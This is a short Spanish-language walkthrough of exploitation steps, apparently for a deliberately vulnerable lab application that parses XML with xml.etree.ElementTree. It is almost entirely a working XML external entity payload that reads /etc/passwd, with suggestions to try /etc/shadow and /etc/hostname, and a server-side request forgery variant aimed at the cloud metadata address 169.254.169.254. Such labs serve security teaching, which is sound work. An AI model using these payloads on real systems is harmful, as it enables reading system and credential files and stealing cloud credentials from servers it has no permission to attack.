Pasos de explotación

  1. El servidor usa xml.etree.ElementTree sin deshabilitar entidades externas.
  2. Haz clic en "XXE Payload" o introduce manualmente el payload:
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user>
  <name>&xxe;</name>
  <email>test@test.com</email>
</user>
  1. El contenido del archivo /etc/passwd aparecerá en el campo name del resultado.
  2. Prueba con otros archivos: file:///etc/hostname, file:///etc/shadow
  3. También puedes usar el protocolo HTTP para SSRF: <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
